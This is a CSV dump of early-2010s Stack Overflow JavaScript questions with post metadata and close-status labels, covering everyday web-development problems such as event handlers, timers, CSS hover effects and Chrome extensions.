PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
10030249,04/05/2012 14:11:00,1264365,03/12/2012 14:36:06,1,0,input hidden don't run onChange event,"Good morning,

I have the follow code:

    <script language=""JavaScript"">
    function doReload()
    {
     	alert('');
     	document.getElementById('doPostBack').value = ""0"";		
     	location.href = 'users.php';
    }
 
    function changes()
    {
  	document.getElementById('doPostBack').value = '1';	
    }
    </script>
    </head>
    <body>
    <div id=""users"" style=""height: 80%;"">
    <form id=""submitForm"" name=""submitForm"" method=""post"">
    <input type=""button"" value=""Novo Usuário"" title=""Adiciona um novo Usuario""      onclick=""location.href = 'registerUser.php'"" />
    <input type=""button"" value=""teste"" onclick=""changes()"">

When I click in teste the event don't run

King Regards,
Renan Paiva",javascript,html,input,hidden,onchange,04/10/2012 21:42:44,not a real question,1,124,6,"input hidden don't run onChange event Good morning,

I have the follow code:

    <script language=""JavaScript"">
    function doReload()
    {
     	alert('');
     	document.getElementById('doPostBack').value = ""0"";		
     	location.href = 'users.php';
    }
 
    function changes()
    {
  	document.getElementById('doPostBack').value = '1';	
    }
    </script>
    </head>
    <body>
    <div id=""users"" style=""height: 80%;"">
    <form id=""submitForm"" name=""submitForm"" method=""post"">
    <input type=""button"" value=""Novo Usuário"" title=""Adiciona um novo Usuario""      onclick=""location.href = 'registerUser.php'"" />
    <input type=""button"" value=""teste"" onclick=""changes()"">

When I click in teste the event don't run

King Regards,
Renan Paiva",5
9697687,03/14/2012 07:40:00,1268297,03/14/2012 06:58:16,1,0,"Modify document html before load with Chrome extension, using document_start","I'm trying to create an extension to modify an existing site, and fix a bug in the existing javascript. A simple replace on the text contents of the document before the load would fix the bug -- specifically, hard-coded values in a <script> tag in the header -- and my first attempt (removing the timestamps from date values) was something like this:

`document.documentElement.innerHTML = document.documentElement.innerHTML.replace(/(""date_of_birth"": new Date\(""[A-Z][a-z]{2}, \d{2} [A-Z][a-z]{2} \d{4}) \d{2}:\d{2}:\d{2} GMT/g, ""$1"");`

For example, any instance of `""date_of_birth"": new Date(""Tue, 30 Oct 1984 00:01:00 GMT"")` becomes `""date_of_birth"": new Date(""Tue, 30 Oct 1984"")`

The problem is that the only way I know of to access the HTML contents of the document is document.documentElement.innerHTML. Running this at document_start fails, as the DOM hasn't been loaded yet, so documentElement.innerHTML is an empty string. Running the above code after the DOM loads will be too late, as the initializing scripts have already run, and modifying the document's html at that point reloads those scripts, causing all kinds of havoc in the script-heavy page.

I cannot simply append to the documentElement before the DOM is loaded, as was the most common suggestion when searching for a solution. This needs to modify the existing scripts before they are loaded and run.

Is there any way to access and preprocess the raw contents of the HTML document before it is loaded?

Thanks in advance.",javascript,google-chrome-extension,,,,,open,0,222,10,"Modify document html before load with Chrome extension, using document_start I'm trying to create an extension to modify an existing site, and fix a bug in the existing javascript. A simple replace on the text contents of the document before the load would fix the bug -- specifically, hard-coded values in a <script> tag in the header -- and my first attempt (removing the timestamps from date values) was something like this:

`document.documentElement.innerHTML = document.documentElement.innerHTML.replace(/(""date_of_birth"": new Date\(""[A-Z][a-z]{2}, \d{2} [A-Z][a-z]{2} \d{4}) \d{2}:\d{2}:\d{2} GMT/g, ""$1"");`

For example, any instance of `""date_of_birth"": new Date(""Tue, 30 Oct 1984 00:01:00 GMT"")` becomes `""date_of_birth"": new Date(""Tue, 30 Oct 1984"")`

The problem is that the only way I know of to access the HTML contents of the document is document.documentElement.innerHTML. Running this at document_start fails, as the DOM hasn't been loaded yet, so documentElement.innerHTML is an empty string. Running the above code after the DOM loads will be too late, as the initializing scripts have already run, and modifying the document's html at that point reloads those scripts, causing all kinds of havoc in the script-heavy page.

I cannot simply append to the documentElement before the DOM is loaded, as was the most common suggestion when searching for a solution. This needs to modify the existing scripts before they are loaded and run.

Is there any way to access and preprocess the raw contents of the HTML document before it is loaded?

Thanks in advance.",2
10519729,05/09/2012 15:59:04,1189101,02/04/2012 08:31:18,87,1,How to convert milliseconds into minutes?,"i got one more problem if any one have any solution please help me.
Ploblem is like this I want to convert milliseconds into minutes in javascript and then decrement minutes by 60000 milliseconds untill it reaches current time for which i am using this code:-

    <?php
    $date2   = date('Y-m-d H:i:s');
    $currentdate = strtotime($date2);
    $targetdate = strtotime('2012-05-09 21:30:00');
    ?>
    <script type=text/javascript>
    var currentdate = <?php echo $currentdate; ?>;
    var targetdate = <?php echo $targetdate; ?>;
    var difference = targetdate - currentdate;
    
    var minutes = Math.floor(difference / 60);
    var i = minutes;
    var intID;
    function decrementMin() {
        if(i==0)
        {
            clearInterval(intID);
            alert('Minute = Congratulation your time begin!');
        }
        if(i>=0){
        document.getElementById('minutes').innerHTML = i + ""minutes;
        i--;
        }
    }
    decrementMin();
    intID = setInterval('decrementMin()', 60000);
    </script>

The problem is like that their are total 478 seconds and when we convert it into minutes then it become 7.9666 but by using Math.floor() it show's 7 minutes and give alert before .9666 second.
If any one have any solution please help me i am waiting for your answer please.",javascript,,,,,,open,0,297,6,"How to convert milliseconds into minutes? i got one more problem if any one have any solution please help me.
Ploblem is like this I want to convert milliseconds into minutes in javascript and then decrement minutes by 60000 milliseconds untill it reaches current time for which i am using this code:-

    <?php
    $date2   = date('Y-m-d H:i:s');
    $currentdate = strtotime($date2);
    $targetdate = strtotime('2012-05-09 21:30:00');
    ?>
    <script type=text/javascript>
    var currentdate = <?php echo $currentdate; ?>;
    var targetdate = <?php echo $targetdate; ?>;
    var difference = targetdate - currentdate;
    
    var minutes = Math.floor(difference / 60);
    var i = minutes;
    var intID;
    function decrementMin() {
        if(i==0)
        {
            clearInterval(intID);
            alert('Minute = Congratulation your time begin!');
        }
        if(i>=0){
        document.getElementById('minutes').innerHTML = i + ""minutes;
        i--;
        }
    }
    decrementMin();
    intID = setInterval('decrementMin()', 60000);
    </script>

The problem is like that their are total 478 seconds and when we convert it into minutes then it become 7.9666 but by using Math.floor() it show's 7 minutes and give alert before .9666 second.
If any one have any solution please help me i am waiting for your answer please.",1
10568673,05/13/2012 01:25:30,1340401,04/18/2012 05:24:21,1,0,How do I grab the current page URL and place it into a new URL reference in JavaScript?,"Here's what I'm using as a custom button control in Salesforce that executes JavaScript.

    	location.replace('/email/author/emailauthor.jsp?retURL=/{!Case.Id}&p3_lkid={!Case.Id}&rtype=003&p7=GetURLHere&p2_lkid={!Case.ContactId}&template_id=00Xc0000000HrOk');

The `GetURLHere` part is where I'd like to grab the current URL and place it. `p7`represents a field I'd like to put it into upon page load.

The usual `document.location.href`doesn't want to work in this control.

Any idea on how to do this in the Force.com environment?",javascript,salesforce,,,,,open,0,62,18,"How do I grab the current page URL and place it into a new URL reference in JavaScript? Here's what I'm using as a custom button control in Salesforce that executes JavaScript.

    	location.replace('/email/author/emailauthor.jsp?retURL=/{!Case.Id}&p3_lkid={!Case.Id}&rtype=003&p7=GetURLHere&p2_lkid={!Case.ContactId}&template_id=00Xc0000000HrOk');

The `GetURLHere` part is where I'd like to grab the current URL and place it. `p7`represents a field I'd like to put it into upon page load.

The usual `document.location.href`doesn't want to work in this control.

Any idea on how to do this in the Force.com environment?",2
6606031,07/07/2011 05:04:38,832843,07/07/2011 04:52:49,1,0,javacript to synchronise the scrolling of two list boxes?,How can we synchronise the scrolling of two list boxes so that scrolling of one list box results in scrolling of the other list box.,javascript,jquery,scroll,,,,open,0,25,9,javacript to synchronise the scrolling of two list boxes? How can we synchronise the scrolling of two list boxes so that scrolling of one list box results in scrolling of the other list box.,3
2183238,02/02/2010 10:17:32,171365,09/10/2009 10:54:00,131,6,how to find time taken to load a page,How to get the time taken to load the current page.,javascript,,,,,08/01/2012 01:16:46,not constructive,1,11,9,how to find time taken to load a page How to get the time taken to load the current page.,1
7628729,10/02/2011 19:39:44,975737,10/02/2011 19:34:43,1,0,CSS Hover to change other elements,"I have this navigation bar which I have done in CSS, I would like it so when I hover over one of the 3 navigation icons it will change the main image background position.

I've tried a few ways but not managed to get them to work properly.


**CSS**


        /* Nav Button 1 */
    
    .nav1 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    }
    
    #nav1
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav1:hover
    { 
      background-position: 0 -107px;
    }
    
    
    /* Nav Button 2 */
    
    .nav2 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #nav2
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav2:hover
    { 
      background-position: 0 -107px;
    }
    
    /* Nav Button 3 */
    
    .nav3 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #nav3
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav3:hover
    { 
      background-position: 0 -107px;
    }

    /* Nav Name */
    
    .navname {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #navname
    {
      display: block;
      width: 228px;
      height: 81px;
      background: url(""images/blank.png"") no-repeat 0 0;
    
    }

**HTML**


	<div id=""navigation"">
		<div class=""nav1"">
		<a id=""nav1"" href=""#""></a>
		</div>
		<div class=""nav2"">
		<a id=""nav2"" href=""#""></a>
		</div>
		<div class=""nav3"">
		<a id=""nav3"" href=""#""></a>
		</div>
		<div class=""navname""><a id=""navname"" href=""#""></a>
		</div>
	</div>

Any ideas how this can be done? The 'navname' element is background position I want to change when hovering over either nav1, nav2, nav3.


Thanks :D",javascript,html,css,hover,nav,,open,0,541,6,"CSS Hover to change other elements I have this navigation bar which I have done in CSS, I would like it so when I hover over one of the 3 navigation icons it will change the main image background position.

I've tried a few ways but not managed to get them to work properly.


**CSS**


        /* Nav Button 1 */
    
    .nav1 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    }
    
    #nav1
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav1:hover
    { 
      background-position: 0 -107px;
    }
    
    
    /* Nav Button 2 */
    
    .nav2 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #nav2
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav2:hover
    { 
      background-position: 0 -107px;
    }
    
    /* Nav Button 3 */
    
    .nav3 {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #nav3
    {
      display: block;
      width: 92px;
      height: 107px;
      background: url(""images/triangle.png"") no-repeat 0 0;
    
    }
    
    #nav3:hover
    { 
      background-position: 0 -107px;
    }

    /* Nav Name */
    
    .navname {
    	float:left;
    	padding-top:20px;
    	border:none;
    	outline:none;
    	padding-right: 0px;
    }
    
    #navname
    {
      display: block;
      width: 228px;
      height: 81px;
      background: url(""images/blank.png"") no-repeat 0 0;
    
    }

**HTML**


	<div id=""navigation"">
		<div class=""nav1"">
		<a id=""nav1"" href=""#""></a>
		</div>
		<div class=""nav2"">
		<a id=""nav2"" href=""#""></a>
		</div>
		<div class=""nav3"">
		<a id=""nav3"" href=""#""></a>
		</div>
		<div class=""navname""><a id=""navname"" href=""#""></a>
		</div>
	</div>

Any ideas how this can be done? The 'navname' element is background position I want to change when hovering over either nav1, nav2, nav3.


Thanks :D",5
8053394,11/08/2011 16:04:42,302707,03/26/2010 16:39:27,400,9,How to do something before on submit?,i have a form and it have a button that submit the form. what i need is to do something before submit happen. i try to do onClick on that button but it happen after the submit. i cant share the code but in general what should i do in jQuery or JS to handel this. ,javascript,jquery,html,,,11/08/2011 17:13:35,not a real question,1,57,7,How to do something before on submit? i have a form and it have a button that submit the form. what i need is to do something before submit happen. i try to do onClick on that button but it happen after the submit. i cant share the code but in general what should i do in jQuery or JS to handel this. ,3
10262585,04/21/2012 20:12:20,1348722,04/21/2012 19:30:50,1,0,Stop random letter with javascript,"Here I have a code:

    <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
    <html xmlns=""http://www.w3.org/1999/xhtml"">
    <head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" />
    <title>Letters</title>
    </head>
    
    <body>
    <div id=""stop"">STOP</div>
    
    <div id=""letter"">A</div>
    <div id=""letter"">G</div>
    <div id=""letter"">D</div>
    <div id=""letter"">M</div>
    <div id=""letter"">S</div>
    <script type=""text/javascript"">
    var letters = ['a','b','c','d', ... ];
    var getRandLetter = function () {
        return letters[ Math.random() * 25 ] //generate a random number between 0 and 25, use this to pick a letter
    }
    setInterval($('#letter').text(getRandLetter()), 500) //pop a random letter in the DOM every 500 ms
    </script>
    
    </body>
    </html>

With script I need to change letter on div every 0,5 seconds but-


NOW I need when I click on STOP div to be: 1st div - ""A"" 2nd div ""B"" ... ... etc. How I can do that. Please HELP! is there any chance to do that!",javascript,html,div,random,,04/22/2012 07:59:08,not a real question,1,214,5,"Stop random letter with javascript Here I have a code:

    <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
    <html xmlns=""http://www.w3.org/1999/xhtml"">
    <head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" />
    <title>Letters</title>
    </head>
    
    <body>
    <div id=""stop"">STOP</div>
    
    <div id=""letter"">A</div>
    <div id=""letter"">G</div>
    <div id=""letter"">D</div>
    <div id=""letter"">M</div>
    <div id=""letter"">S</div>
    <script type=""text/javascript"">
    var letters = ['a','b','c','d', ... ];
    var getRandLetter = function () {
        return letters[ Math.random() * 25 ] //generate a random number between 0 and 25, use this to pick a letter
    }
    setInterval($('#letter').text(getRandLetter()), 500) //pop a random letter in the DOM every 500 ms
    </script>
    
    </body>
    </html>

With script I need to change letter on div every 0,5 seconds but-


NOW I need when I click on STOP div to be: 1st div - ""A"" 2nd div ""B"" ... ... etc. How I can do that. Please HELP! is there any chance to do that!",4
10035396,04/05/2012 20:18:50,1128717,01/03/2012 21:17:44,165,0,Substract two strings in javascript,"kwd variable holds this value:  **news path:"".aspx""**
It is basically the query string of an url.
  

      var path= ""path:\"".aspx\""""; 
so kwd=  whatever user types passed to the url like this+path:

    kwd=news path:"".aspx"";

I need to subtract kwd-path so i get only ""news""
How do i do that in java-script or jquery?

I know i can either use trim or substring or substr..
But I couldn't get to work .
I am basically using this logic:

    if (b.startsWith(a)) {
            return b.subString(a.length());
        }
    
        if (b.endsWith(a)) {
            return b.subString(0, b.length() - a.length());
        }

But this is not working..
   

     var persistvalue= kwd.subString(0, kwd.length() - path.length());",javascript,jquery,substring,trim,substr,,open,0,163,5,"Substract two strings in javascript kwd variable holds this value:  **news path:"".aspx""**
It is basically the query string of an url.
  

      var path= ""path:\"".aspx\""""; 
so kwd=  whatever user types passed to the url like this+path:

    kwd=news path:"".aspx"";

I need to subtract kwd-path so i get only ""news""
How do i do that in java-script or jquery?

I know i can either use trim or substring or substr..
But I couldn't get to work .
I am basically using this logic:

    if (b.startsWith(a)) {
            return b.subString(a.length());
        }
    
        if (b.endsWith(a)) {
            return b.subString(0, b.length() - a.length());
        }

But this is not working..
   

     var persistvalue= kwd.subString(0, kwd.length() - path.length());",5
6277180,06/08/2011 10:10:07,256077,01/21/2010 18:33:50,707,38,JavaScript revealing module pattern re-factoring advice,"Not so much of a specific question, more of a request to make sure i am on the right path or not and get some advice from more experienced JavaScript ninjas. 

I am using the revealing module pattern with JavaScript quite alot to organise my code in my current project but am wondering if i could use it in a better way as i seem to be creating lots of private methods and then calling them in a linear fashion i.e. when one method has performed its operation then call another and then another and so on.

The code works but would like to see if it could work better, more efficiently or with less code to achieve the same result.  

An example module would be below where we need to:

 1. Bind a click event to a tab
 2. set some meta data values
 3. Call 3rd party tracking functions
 4. Reset the meta data to its original value

        icisSite.tabPageView = function($){
    	
    	var $tabs = $('.tbc .tbc-tabs > div'),
    		pageName = $('meta[name=gwa_pageName]'),
    		sec3 = $('meta[name=gwa_siteSection3]'),
    		sec4 = $('meta[name=gwa_siteSection4]'),
    		pageNameLen = pageName.length,
    		sec3Len = sec3.length,
    		sec4Len = sec4.length,
    		txt,
    		pNameContent,
    		pNameConstruct,
    		section,
    		metaContent,
    		metaConstruct;
    	
    	function init() {	
    		bindClickHandlerToTabs();
    	};	
    	
    	function bindClickHandlerToTabs() {
    		if (pageNameLen !== 0 && (sec3Len !== 0 || sec4Len !== 0)){
    			$tabs.bind('click', updateMetaData(){
    				txt = $(this).find('span').text(),
    				txt = ' | ' + txt;
    				updateMetaData();
    			});	
    		} else {
    			return false;
    		}			
    	};	
    	
    	function updateMetaData(){
            pNameContent = pageName.attr('content'),
            pNameConstruct = pNameContent + txt;
            if (sec3Len !== 0 && sec4Len !== 0){
    			section = 'gwa_siteSection4',
    			metaContent = sec4.attr('content'),
    			metaConstruct = metaContent + txt;
            } else {
    			section = 'gwa_siteSection3'
    			metaContent = sec3.attr('content'),
    			metaConstruct = metaContent + txt;
            }	
    		return callGWATrackingFucntions();	
    	};
    
    	function callGWATrackingFucntions() {
            gwa_SetMetaValue(section, metaConstruct); 
            gwa_trackPageView(pNameConstruct);
    		return resetMetaData();
    	};
    
    	function resetMetaData() { 
            pageName.attr('content', pNameContent);
            $('meta').each(function(index){
                var name = $(this).attr('name');
                if (section === name){
    				$(this).attr('content', metaContent);	
                }
            });		
    	};
    	
    	return {
    		init: init	
    	};
    
    }(jQuery);
    
    icisSite.tabPageView.init();",javascript,jquery,design-patterns,refactoring,,06/08/2011 11:41:24,not a real question,1,658,6,"JavaScript revealing module pattern re-factoring advice Not so much of a specific question, more of a request to make sure i am on the right path or not and get some advice from more experienced JavaScript ninjas. 

I am using the revealing module pattern with JavaScript quite alot to organise my code in my current project but am wondering if i could use it in a better way as i seem to be creating lots of private methods and then calling them in a linear fashion i.e. when one method has performed its operation then call another and then another and so on.

The code works but would like to see if it could work better, more efficiently or with less code to achieve the same result.  

An example module would be below where we need to:

 1. Bind a click event to a tab
 2. set some meta data values
 3. Call 3rd party tracking functions
 4. Reset the meta data to its original value

        icisSite.tabPageView = function($){
    	
    	var $tabs = $('.tbc .tbc-tabs > div'),
    		pageName = $('meta[name=gwa_pageName]'),
    		sec3 = $('meta[name=gwa_siteSection3]'),
    		sec4 = $('meta[name=gwa_siteSection4]'),
    		pageNameLen = pageName.length,
    		sec3Len = sec3.length,
    		sec4Len = sec4.length,
    		txt,
    		pNameContent,
    		pNameConstruct,
    		section,
    		metaContent,
    		metaConstruct;
    	
    	function init() {	
    		bindClickHandlerToTabs();
    	};	
    	
    	function bindClickHandlerToTabs() {
    		if (pageNameLen !== 0 && (sec3Len !== 0 || sec4Len !== 0)){
    			$tabs.bind('click', updateMetaData(){
    				txt = $(this).find('span').text(),
    				txt = ' | ' + txt;
    				updateMetaData();
    			});	
    		} else {
    			return false;
    		}			
    	};	
    	
    	function updateMetaData(){
            pNameContent = pageName.attr('content'),
            pNameConstruct = pNameContent + txt;
            if (sec3Len !== 0 && sec4Len !== 0){
    			section = 'gwa_siteSection4',
    			metaContent = sec4.attr('content'),
    			metaConstruct = metaContent + txt;
            } else {
    			section = 'gwa_siteSection3'
    			metaContent = sec3.attr('content'),
    			metaConstruct = metaContent + txt;
            }	
    		return callGWATrackingFucntions();	
    	};
    
    	function callGWATrackingFucntions() {
            gwa_SetMetaValue(section, metaConstruct); 
            gwa_trackPageView(pNameConstruct);
    		return resetMetaData();
    	};
    
    	function resetMetaData() { 
            pageName.attr('content', pNameContent);
            $('meta').each(function(index){
                var name = $(this).attr('name');
                if (section === name){
    				$(this).attr('content', metaContent);	
                }
            });		
    	};
    	
    	return {
    		init: init	
    	};
    
    }(jQuery);
    
    icisSite.tabPageView.init();",4
7287177,09/02/2011 17:32:56,925750,09/02/2011 17:32:56,1,0,Javascript to add delivery fee based on certain price,"I have website where I am implementing a checkout solution.

I have a calculator that determines a price based on the amount of items the customer specifies. 

Once the customer clicks calculate, two values are shown on that page:

Installed price

and

Not Installed price

The user then clicks buy now and the values are sent to a second page via post. 

That page has 2 buttons with the values of the previous pages amounts. 

Both buttons have the same name ""amount"" because my next page (the credit card checkout) shows what ever amount they selected. And the variable to that cart field is ""amount""

also a hidden field of ""qty"" is sent form page 2 to show the total number of items they ordered. (its only one item type they are purchasing).

I need a javascript on that second page. 

When the user clicks whichever price (button, installed or not installed) , the javascript needs to do two things :

1. Calculate a sales tax of 6% (to be sent to final order page)
2. add a delivery cost of $10 unless the amount is over $50. (before tax price is added)
 
I need to post the price to the last page still as the ""amount"" as it currently does now, but I need to add a field to the final page that shows the delivery fee field ONLY if the delivery fee applies, other wise the amount should be $0.00

And I need a field that show the tax amount that was calculated for the price they selected in page 2.

Lastly, I need to add a field to show the total sum. So it should look like this on the final page:

1. Qty
2. Price (installed or not installed)
3. Delivery fee (only if order under $50)
4. Sales tax
5. Total Price

I looked here and this is similar what I need, but I don't want the on window alert and I don't know the proper syntax for my specific need. 

http://stackoverflow.com/questions/4606296/in-javascript-doing-a-simple-shipping-and-handling-calculation

Can anyone tell me the correct syntax for what I am trying to do?













",javascript,,,,,09/02/2011 18:17:15,not a real question,1,333,9,"Javascript to add delivery fee based on certain price I have website where I am implementing a checkout solution.

I have a calculator that determines a price based on the amount of items the customer specifies. 

Once the customer clicks calculate, two values are shown on that page:

Installed price

and

Not Installed price

The user then clicks buy now and the values are sent to a second page via post. 

That page has 2 buttons with the values of the previous pages amounts. 

Both buttons have the same name ""amount"" because my next page (the credit card checkout) shows what ever amount they selected. And the variable to that cart field is ""amount""

also a hidden field of ""qty"" is sent form page 2 to show the total number of items they ordered. (its only one item type they are purchasing).

I need a javascript on that second page. 

When the user clicks whichever price (button, installed or not installed) , the javascript needs to do two things :

1. Calculate a sales tax of 6% (to be sent to final order page)
2. add a delivery cost of $10 unless the amount is over $50. (before tax price is added)
 
I need to post the price to the last page still as the ""amount"" as it currently does now, but I need to add a field to the final page that shows the delivery fee field ONLY if the delivery fee applies, other wise the amount should be $0.00

And I need a field that show the tax amount that was calculated for the price they selected in page 2.

Lastly, I need to add a field to show the total sum. So it should look like this on the final page:

1. Qty
2. Price (installed or not installed)
3. Delivery fee (only if order under $50)
4. Sales tax
5. Total Price

I looked here and this is similar what I need, but I don't want the on window alert and I don't know the proper syntax for my specific need. 

http://stackoverflow.com/questions/4606296/in-javascript-doing-a-simple-shipping-and-handling-calculation

Can anyone tell me the correct syntax for what I am trying to do?













",1
7035417,08/12/2011 03:52:56,286807,03/05/2010 03:28:57,11,0,WebKit and window.onerror,"WebKit has recently closed a 5 year old ticket adding window.onerror master error handler. The unfortunate thing is that they implemented it without the ability to inspect the error and no call stack looping capability (like IE). Although they implemented as per html5 specification,  the lack of a stack makes it close to useless for cross browser code.

The question I wanted to ask is what would you prefer if you had to choose between one of the two options:

 1) Error with stack parameter
     - Error is machine parsable like mozilla
     - stack would contain url, function and line number like moz
     - Adv: Error inspection, Simple stack parsing, Source files, Line numbers
     - Dis: No arguments inspection

 2) Call stack that chains back through to top calls
     - This is how IE works
     - Use arguments.callee.caller to loop up
     - Adv: can inspect arguments up the call stack
     - Dis: No source file names, No line numbers

Your input is greatly appreciated. I will post results back to WebKit folks to see if they can close the window.onerror for good.

Thanks for your time.

JsD",javascript,error-handling,webkit,,,08/12/2011 08:11:35,not constructive,1,216,3,"WebKit and window.onerror WebKit has recently closed a 5 year old ticket adding window.onerror master error handler. The unfortunate thing is that they implemented it without the ability to inspect the error and no call stack looping capability (like IE). Although they implemented as per html5 specification,  the lack of a stack makes it close to useless for cross browser code.

The question I wanted to ask is what would you prefer if you had to choose between one of the two options:

 1) Error with stack parameter
     - Error is machine parsable like mozilla
     - stack would contain url, function and line number like moz
     - Adv: Error inspection, Simple stack parsing, Source files, Line numbers
     - Dis: No arguments inspection

 2) Call stack that chains back through to top calls
     - This is how IE works
     - Use arguments.callee.caller to loop up
     - Adv: can inspect arguments up the call stack
     - Dis: No source file names, No line numbers

Your input is greatly appreciated. I will post results back to WebKit folks to see if they can close the window.onerror for good.

Thanks for your time.

JsD",3
3492717,08/16/2010 11:37:29,419859,08/13/2010 18:06:44,15,0,I donot know anything about Qooxdoo. Help me..,I am new to Qooxdoo. I downloaded it. After that i donot know the next step. I want to know how to work in it. I went through http://qooxdoo.org/documentation/1.1#getting_started but am not getting way to work. Please can anyone say me how should i work. I will work as such u say stepwise,javascript,ajax,qooxdoo,,,08/16/2010 15:08:59,not a real question,1,53,8,I donot know anything about Qooxdoo. Help me.. I am new to Qooxdoo. I downloaded it. After that i donot know the next step. I want to know how to work in it. I went through http://qooxdoo.org/documentation/1.1#getting_started but am not getting way to work. Please can anyone say me how should i work. I will work as such u say stepwise,3
11272391,06/30/2012 07:41:40,379235,06/29/2010 16:45:28,1725,32,"jQuery, bootstrap: input.val() is undefined, even though jsfiddle works fine","I have a jsfiddle here : http://jsfiddle.net/hhimanshu/ukYek/  

This works fine on jsfiddle, but when I do the same in my app, firebug says  

    input.val() is undefined
    
    $('#create-playlist-button').attr('disabled',input.val().length==0);  

I did some googling and found a related [question][1]

**Question**  
- How do I fix this issue, when the javascript is already loaded and form segment is loaded little late with ajax event?  



  [1]: http://stackoverflow.com/questions/5006045/jquery-val-is-undefined",javascript,jquery,twitter-bootstrap,,,,open,0,79,10,"jQuery, bootstrap: input.val() is undefined, even though jsfiddle works fine I have a jsfiddle here : http://jsfiddle.net/hhimanshu/ukYek/  

This works fine on jsfiddle, but when I do the same in my app, firebug says  

    input.val() is undefined
    
    $('#create-playlist-button').attr('disabled',input.val().length==0);  

I did some googling and found a related [question][1]

**Question**  
- How do I fix this issue, when the javascript is already loaded and form segment is loaded little late with ajax event?  



  [1]: http://stackoverflow.com/questions/5006045/jquery-val-is-undefined",3
